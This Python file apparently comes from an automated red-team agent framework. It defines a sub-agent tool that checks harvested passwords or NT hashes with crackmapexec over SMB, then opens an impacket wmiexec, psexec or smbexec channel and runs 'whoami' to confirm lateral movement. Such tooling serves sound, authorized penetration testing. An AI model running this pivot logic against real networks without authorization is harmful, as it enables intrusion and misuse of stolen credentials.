"""PivotExecutor sub-agent (spec §7.4, Phase 5).

Two-step pivot protocol:
  1. **Credential validation** — crackmapexec spray against the target.
     A credential that fails CME auth will fail the remote-exec channel
     too, so this is the cheap gate. (Also yields the ``pwned`` flag.)
  2. **Channel probe** — the candidate method's impacket remote-exec
     tool runs ``whoami``. Success records a :class:`PivotRecord`.

A failed validation or probe returns a ``success=False`` PivotRecord —
the Lateral Agent then tries the next candidate (Review Focus #2).
"""
from datetime import datetime

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.models.lateral import PivotRecord
from autored.tools.crackmapexec import crackmapexec
from autored.tools.impacket_remote import (
    impacket_psexec,
    impacket_smbexec,
    impacket_wmiexec,
)

log = get_logger("subagents.pivotexecutor")


class PivotExecutorOutput(BaseModel):
    """Result of one pivot execution attempt."""

    pivot: PivotRecord | None = None
    success: bool = False
    output: str = ""


def _cred_kwargs(candidate: dict) -> dict:
    """Map candidate cred fields onto tool auth kwargs (hash wins)."""
    password = candidate["secret_value"] if candidate["cred_type"] == "password" else ""
    nthash = candidate["secret_value"] if candidate["cred_type"] == "hash" else ""
    return {"password": password, "nthash": nthash}


@tool
async def pivotexecutor_subagent(
    candidate: dict,
    engagement_id: str = "",
) -> PivotExecutorOutput:
    """Execute a lateral pivot: validate creds, then open a remote-exec channel.

    Args:
        candidate: A PivotCandidate.model_dump() dict — credential_id,
            username, cred_type, secret_value, source_host, target_host,
            method, confidence.
        engagement_id: Current engagement ID.

    Returns:
        PivotExecutorOutput with the executed PivotRecord (success or
        failure) for the Lateral Agent to record / skip past.
    """
    target = candidate["target_host"]
    method = candidate["method"]
    username = candidate["username"]
    auth = _cred_kwargs(candidate)
    log.info("pivotexecutor_start", target=target, method=method, user=username)

    # Step 1: credential validation spray
    cme = await crackmapexec.ainvoke(
        protocol="smb",
        target=target,
        username=username,
        **auth,
        engagement_id=engagement_id,
    )

    pivot = PivotRecord(
        target_host=target,
        method=method,
        credentials_used=[candidate["credential_id"]],
        needs_tunnel=False,
        timestamp=datetime.utcnow(),
    )

    if not cme.success:
        log.info("pivotexecutor_creds_invalid", target=target, user=username)
        return PivotExecutorOutput(
            pivot=pivot, success=False, output=cme.output,
        )

    # Step 2: channel probe via the method's remote-exec tool.
    # Built at call time so tests can patch the module-level tool
    # names (a module-level dict would freeze the original objects).
    channels = {
        "wmiexec": impacket_wmiexec,
        "psexec": impacket_psexec,
        "smbexec": impacket_smbexec,
    }
    channel = channels.get(method)
    if channel is not None:
        probe = await channel.ainvoke(
            username=username,
            **auth,
            target=target,
            command="whoami",
            engagement_id=engagement_id,
        )
        pivot.success = probe.success
        output = probe.output
    else:
        # crackmapexec-only methods: CME success IS the pivot
        pivot.success = True
        output = cme.output

    log.info(
        "pivotexecutor_done", target=target, method=method, success=pivot.success,
    )
    return PivotExecutorOutput(pivot=pivot, success=pivot.success, output=output)
